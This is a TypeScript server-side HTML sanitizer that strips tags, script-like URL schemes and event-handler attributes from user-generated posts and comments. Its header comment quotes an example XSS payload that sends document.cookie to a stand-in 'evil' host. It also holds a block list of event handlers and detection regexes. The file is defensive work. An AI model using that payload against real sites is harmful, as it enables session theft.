/**
 * html-sanitizer.ts — server-side XSS defense for user-generated content.
 *
 * React auto-escapes rendered strings, so displaying user content in the UI
 * is already safe. This module handles the second layer: if a bad actor
 * hits the raw API or a future surface renders user content in HTML context
 * (email, PDF, admin panel), we don't want stored payloads like
 *   <img src=x onerror=fetch('//evil/'+document.cookie)>
 * to sit in the DB waiting for a slip-up.
 *
 * Strategy: strip every < ... > tag and every javascript: / data: URL
 * scheme, plus event-handler attributes. This is a defense-in-depth pass
 * for storing scout job posts, forum messages, comments, etc. Not a
 * replacement for output escaping.
 */

// Every event handler attribute browsers know about. If any user string
// somehow lands in an HTML render surface, these can trigger JS execution.
const DANGEROUS_ATTRS = [
  "onload", "onerror", "onclick", "onmouseover", "onmouseout", "onfocus",
  "onblur", "onchange", "onsubmit", "onkeydown", "onkeyup", "onkeypress",
  "onmousedown", "onmouseup", "onmousemove", "ondblclick", "oncontextmenu",
  "ondragstart", "ondragend", "ondrop", "onwheel", "onscroll", "onresize",
  "onbeforeunload", "onunload", "onhashchange", "ontoggle", "onanimationstart",
  "onanimationend", "ontransitionend", "onmessage", "onpopstate",
];

const TAG_RE            = /<\/?[a-zA-Z][^>]*>/g;
const SCRIPT_BLOCK_RE   = /<script[\s\S]*?<\/script>/gi;
const STYLE_BLOCK_RE    = /<style[\s\S]*?<\/style>/gi;
const IFRAME_BLOCK_RE   = /<iframe[\s\S]*?<\/iframe>/gi;
const JS_SCHEME_RE      = /\bjavascript\s*:/gi;
const DATA_SCHEME_RE    = /\bdata\s*:\s*text\/html/gi;
const VBSCRIPT_SCHEME_RE = /\bvbscript\s*:/gi;
const ATTR_HANDLER_RE   = new RegExp(`\\b(${DANGEROUS_ATTRS.join("|")})\\s*=`, "gi");

/**
 * Strip every HTML tag + dangerous URL scheme + event handler. Preserves
 * text content, blank lines, and unicode. Idempotent (safe to run twice).
 */
export function stripHtml(input: string | null | undefined): string {
  if (!input) return "";
  let s = String(input);
  s = s.replace(SCRIPT_BLOCK_RE,  " ");
  s = s.replace(STYLE_BLOCK_RE,   " ");
  s = s.replace(IFRAME_BLOCK_RE,  " ");
  s = s.replace(TAG_RE,           " ");
  s = s.replace(JS_SCHEME_RE,     "");
  s = s.replace(DATA_SCHEME_RE,   "");
  s = s.replace(VBSCRIPT_SCHEME_RE, "");
  s = s.replace(ATTR_HANDLER_RE,  "safe-attr=");
  // Collapse whitespace runs but preserve intentional blank lines
  s = s.replace(/[ \t]{2,}/g, " ").replace(/\n{3,}/g, "\n\n");
  return s.trim();
}

/**
 * Sanitize an object's string fields in-place. Fields not listed are left
 * untouched. Non-string values are returned as-is.
 */
export function sanitizeStringFields<T extends Record<string, any>>(
  obj: T,
  fields: (keyof T)[],
): T {
  const out: any = { ...obj };
  for (const k of fields) {
    if (typeof out[k] === "string") out[k] = stripHtml(out[k]);
  }
  return out;
}
